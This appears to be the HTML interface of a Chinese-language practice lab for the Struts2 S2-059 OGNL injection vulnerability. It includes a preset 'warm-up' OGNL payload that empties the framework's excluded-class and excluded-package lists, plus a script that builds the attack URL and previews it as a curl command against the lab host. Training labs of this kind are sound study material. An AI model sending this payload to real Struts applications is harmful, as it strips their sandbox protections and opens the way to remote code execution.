...
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-059 靶场</h1>
        <p>这个模块把危险输入点放在请求参数 <code>id</code>，并通过页面上的 Struts 标签把它二次用于 <code>id="%{id}"</code> 属性，模拟属性值双重解析。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset()">填充预热 Payload</button>
            <button type="button" class="submit-btn" onclick="runQuery()">按当前 id 重新访问</button>
        </div>
        ...
        <div class="field">
            ...
            <textarea id="payloadBox">%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}</textarea>
        </div>
        <pre id="preview"></pre>
    </div>
</div>
<script>
    ...
    function buildUrl() {
        return 'index.action?id=' + strictEncode(document.getElementById('payloadBox').value);
    }
    function refreshPreview() {
        document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9948/' + buildUrl() + '"';
    }
    function runQuery() {
